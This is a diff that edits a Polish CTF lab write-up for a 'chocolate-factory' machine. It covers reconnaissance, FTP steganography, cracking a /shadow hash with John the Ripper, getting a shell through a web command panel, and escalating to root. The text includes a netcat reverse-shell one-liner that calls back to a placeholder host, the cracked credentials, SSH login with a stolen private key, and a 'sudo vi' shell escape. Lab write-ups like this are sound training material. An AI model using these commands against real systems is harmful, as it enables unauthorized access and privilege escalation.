@@ -2,7 +2,7 @@
 IP=10.10.108.33
 
 ## Rekonesans
-Wykonujemy skan maszyny przy pomocy narzędzia nmap:
+Przeprowadzamy wstępny skan za pomocą narzędzia nmap:
 ```sh
 sudo nmap -p- 10.10.108.33
 ```
@@ -44,11 +44,11 @@ PORT    STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 96.76 seconds
 ```
-Znając otwarte porty możemy przejść do bardziej dokładnego skanu:
+Po zidentyfikowaniu otwartych portów przeprowadzamy bardziej szczegółowy skan:
 ```sh
 sudo nmap -p 21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125 -sV -sC 10.10.108.33
 ```
-Porty: 80 (HTTP), 21 (FTP) i 22 (SSH) są najbardziej interesujące ze względów bezpieczeństwa, reszta otwartych portów to nieco mniej ciekawe usługi.
+Porty 80 (HTTP), 21 (FTP) oraz 22 (SSH) są najważniejsze ze względu na potencjalne zagrożenia bezpieczeństwa.
 
 ```
 PORT    STATE SERVICE     VERSION
@@ -80,7 +80,7 @@ PORT    STATE SERVICE     VERSION
 |_http-title: Site doesn't have a title (text/html).
 |_auth-owners: ERROR: Script execution failed (use -d to debug)
 ```
-Dodatkowo na porcie 113 można znaleźć ciekawy link:
+Na porcie 113 można znaleźć interesujący link:
 ```
 113/tcp open  ident?
 |_auth-owners: ERROR: Script execution failed (use -d to debug)
@@ -91,12 +91,12 @@ Dodatkowo na porcie 113 można znaleźć ciekawy link:
 ## Skanowanie
 
 ### Port 113
-Zacznijmy od sprawdzenia portu 113. Za pomocą narzędzia wget pobierzmy tajemniczy plik:
+Rozpoczynamy od sprawdzenia portu 113. Pobieramy plik za pomocą narzędzia wget:
 ```
 wget http://10.10.108.33/key_rev_key
 ```
 
-Pobrany plik key_rev_key jest plikiem binarnym, zatem warto spróbować wydobyć z niego informacje komedną strings:
+Pobrany plik key_rev_key jest plikiem binarnym. Warto spróbować wydobyć z niego informacje za pomocą komendy strings:
 ```
 strings key_rev_key | less
 ```
@@ -106,17 +106,17 @@ Wynik:
 b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 ```
 ### Port 21
-Nmap wykazał, że logowanie Anonymous do serwisu FTP jest możliwe oraz znajduje się tam plik w foramcie jpg:
+Nmap wykazał, że logowanie anonimowe do serwisu FTP jest możliwe oraz znajduje się tam plik w formacie jpg:
 ```
 21/tcp  open  ftp         vsftpd 3.0.3
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
 ```
-Zalogujmy się do serwisu i pobierzmy plik:
+Logujemy się do serwisu FTP i pobieramy plik:
 
 ![FTP](img/FTP.JPG)
 
-Sprawdźmy czy plik nie zawiera jakichś ukrytych danych:
+Sprawdzamy, czy plik nie zawiera ukrytych danych:
 ```
 └─$ steghide extract -sf gum_room.jpg
 Enter passphrase: 
@@ -126,24 +126,24 @@ Udało się wydobyć ukryte dane, które zostały zapisane do pliku b64.txt:
 
 ![B64](img/B64.JPG)
 
-Wygląda to na kodowanie base64, wykorzystajmy narzędzie CyberChef:
+Plik zawiera dane zakodowane w base64. Zdekodujemy je za pomocą narzędzia CyberChef:
 
 ![CyberChef](img/CyberChef.JPG)
 
-Odkodowany tekst jest plikiem /shadow używanym w systemie Linux. Hasło użytkownika charlie jest zapisane w formacie hash, a dokładniej w SHA-512, co widać po pierwszych trzech znakach. ('$6$' = SHA-512 | '$5$'=SHA=256 itd.)
+Odkodowany tekst to plik /shadow używany w systemie Linux. Hasło użytkownika Charlie jest zapisane w formacie hash SHA-512, co widać po pierwszych trzech znakach ('$6$' = SHA-512 | '$5$'=SHA=256 itd.):
 
 ```
 charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
 ```
-Stwórzmy plik tesktowy hash.txt z poniższym hashem:
+Tworzymy plik tekstowy hash.txt z powyższym hashem:
 ```
 $6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/
 ```
-A następnie spróbujmy złamać hash przy użyciu narzędzia john:
+Następnie próbujemy złamać hash przy użyciu narzędzia John the Ripper:
 ```
 john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
-Po chwili udaje się złamać hasha:
+Po krótkiej chwili udaje się złamać hash:
 
 ![John](img/John.JPG)
 
@@ -159,40 +159,40 @@ Na porcie 80 znajduje się strona internetowa z panelem logowania:
 
 ![login_page](img/login_page.JPG)
 
-Spróbujmy się zalogować przy użyciu znalezionych danych:
+Logujemy się przy użyciu znalezionych danych:
 
 ```
 charlie:cn7823
 ```
 
-Po zalogowaniu uzyskujemy dostęp do panelu, dzięki któremu możemy wykonywać dowolne polecenia na serwerze:
+Po zalogowaniu uzyskujemy dostęp do panelu, który pozwala na wykonywanie dowolnych poleceń na serwerze:
 
 ![Panel](img/Panel.JPG)
 
 ## Eksploitacja
 
-Możemy spróbować reverse shell'a, aby uzyskać połączenie z maszyną, za pomocą komendy:
+Spróbujemy uzyskać dostęp do systemu poprzez reverse shell, używając następującej komendy:
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [IP] [Port] >/tmp/f
 ```
-oraz
+Następnie słuchamy połączeń za pomocą narzędzia netcat:
 ```
 nc -lvnp 4444
 ```
 
 ![RevShell](img/RevShell.JPG)
 
-Po stabilizacji shella możemy przejść do eksploitacji maszyny. W katalogu domowym użytkownika charlie można znaleźć jego prywatny klucz RSA:
+Po stabilizacji shella przystępujemy do dalszej eksploracji maszyny. W katalogu domowym użytkownika Charlie znajduje się jego prywatny klucz RSA:
 
 ![RSA_KEY](img/RSA_KEY.JPG)
 
-Pamiętając o uruchomionej usłudze ssh na porcie 22 spróbujmy się zalogować jako użytkownik charlie. W tym celu stwórzmy plik ,,rsa" zawierający klucz prywatny oraz nadajmy mu uprawnienia komedną:
+Ponieważ usługa SSH na porcie 22 jest włączona, próbujemy zalogować się jako użytkownik Charlie. Tworzymy plik rsa zawierający klucz prywatny i nadajemy mu odpowiednie uprawnienia:
 
 ```
 chmod 600 rsa
 ```
 
-Przy użyciu klucza prywatnego zalogujmy się na konto użytkownika charlie:
+Logujemy się przy użyciu klucza prywatnego:
 
 ```
 ssh -i rsa charlie@10.10.108.33
@@ -210,7 +210,7 @@ flag{cd5509042371b34e4826e4838b522d2e}
 
 ## Zwiększenie poziomu uprawnień
 
-Za pomocą poniższej komedny sprawdzamy uprawnienia użytkownika charlie w systemie:
+Sprawdzamy uprawnienia użytkownika Charlie w systemie:
 
 ```
 charlie@chocolate-factory:/home/charlie$ sudo -l
@@ -221,7 +221,7 @@ User charlie may run the following commands on chocolate-factory:
     (ALL : !root) NOPASSWD: /usr/bin/vi
 ```
 
-Wykorzystajmy fakt, że użytkownik charlie może wykonywać komednę vi jako root:
+Użytkownik Charlie może uruchomić komendę vi jako root. Wykorzystujemy to do uzyskania dostępu do konta root:
 
 ```
 sudo vi -c ':!/bin/sh' /dev/null
@@ -229,11 +229,11 @@ sudo vi -c ':!/bin/sh' /dev/null
 
 ![Vi_Command](img/Vi_Command.JPG)
 
-Uzyskaliśmy właśnie uprawnienia roota. W folderze /root znajduje się program root.py:
+Uzyskaliśmy uprawnienia roota. W folderze /root znajduje się program root.py:
 
 ![Python](img/Python.JPG)
 
-Program ten używa podanego klucza do odszyfrowania wiadomości. Spróbujmy wykorzystać klucz znaleziony podczas rekonesansu na porcie 113 i odpalić program:
+Program używa podanego przez użytkownika klucza do odszyfrowania wiadomości. Wykorzystujemy klucz znaleziony na porcie 113 i uruchamiamy program:
 
 ![Root](img/Root.JPG)
 
@@ -242,3 +242,5 @@ Flaga root została zdobyta!
 ```
 flag{cec59161d338fef787fcb4e296b42124}
 ```
+
+Do zobaczenia na kolejnych CTF-ach!
